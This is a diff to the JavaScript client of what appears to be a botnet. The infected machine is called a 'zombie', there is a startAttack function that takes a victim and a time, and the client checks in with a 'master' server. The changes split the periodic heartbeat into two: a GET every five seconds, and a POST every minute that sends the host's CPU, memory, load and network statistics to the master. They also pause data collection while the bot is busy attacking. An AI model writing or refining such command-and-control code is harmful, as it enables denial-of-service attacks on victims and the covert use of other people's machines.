@@ -284,8 +284,19 @@ async function startAttack(methodData, victim, time) {
 
 }
 
-async function heartbeat() {
-    axios.post("http://" + master + "/heartbeat", {machine: zombie})
+async function complexHeartbeat() {
+    if (!zombie.busy) {
+        axios.post("http://" + master + "/heartbeat", { machine: zombie })
+            .then(res => {
+
+            })
+            .catch(err => {
+                console.error(err);
+            })
+    }
+}
+async function simpleHeartbeat() {
+    axios.get("http://" + master + "/heartbeat")
         .then(res => {
             if (res.data.port.changeAt < Date.now() || res.data.port.last === zombie.port) {
                 console.log(res.data.port.changeAt < Date.now());
@@ -301,11 +312,17 @@ async function heartbeat() {
         })
 }
 
-heartbeat();
+simpleHeartbeat();
+complexHeartbeat();
 
 setInterval(function () {
-    heartbeat()
+    simpleHeartbeat()
 }, 5000)
+
+
+setInterval(function () {
+    complexHeartbeat()
+}, 60000)
 
 setInterval(() => {
     siDataPlacement()
@@ -315,30 +332,34 @@ si.getDynamicData(function (data) {
     zombie.systemInfo.dynamic.all = data
 })
 setInterval(() => {
-    si.getDynamicData(function (data) {
-        zombie.systemInfo.dynamic.all = data
-    })
+    if (!zombie.busy) {
+        si.getDynamicData(function (data) {
+            zombie.systemInfo.dynamic.all = data
+        })
+    }
 }, 30000);
 
 async function siDataPlacement() {
-    si.cpu(function (cpudata) {
-        zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
-        zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
-        zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
-    })
-    si.mem(function (memdata) {
-        zombie.systemInfo.dynamic.mem.total = memdata.total
-        zombie.systemInfo.dynamic.mem.free = memdata.free
-        zombie.systemInfo.dynamic.mem.used = memdata.used
-        zombie.systemInfo.dynamic.mem.active = memdata.active
-        zombie.systemInfo.dynamic.mem.available = memdata.available
-    })
-    si.currentLoad(function (data) {
-        zombie.systemInfo.dynamic.load = data
-    })
-    si.networkStats(function (data) {
-        zombie.systemInfo.dynamic.net = data
-    })
+    if (!zombie.busy) {
+        si.cpu(function (cpudata) {
+            zombie.systemInfo.dynamic.cpu.voltage = cpudata.voltage
+            zombie.systemInfo.dynamic.cpu.speed = cpudata.speed
+            zombie.systemInfo.dynamic.cpu.brand = cpudata.brand
+        })
+        si.mem(function (memdata) {
+            zombie.systemInfo.dynamic.mem.total = memdata.total
+            zombie.systemInfo.dynamic.mem.free = memdata.free
+            zombie.systemInfo.dynamic.mem.used = memdata.used
+            zombie.systemInfo.dynamic.mem.active = memdata.active
+            zombie.systemInfo.dynamic.mem.available = memdata.available
+        })
+        si.currentLoad(function (data) {
+            zombie.systemInfo.dynamic.load = data
+        })
+        si.networkStats(function (data) {
+            zombie.systemInfo.dynamic.net = data
+        })
+    }
 }
 
 /*
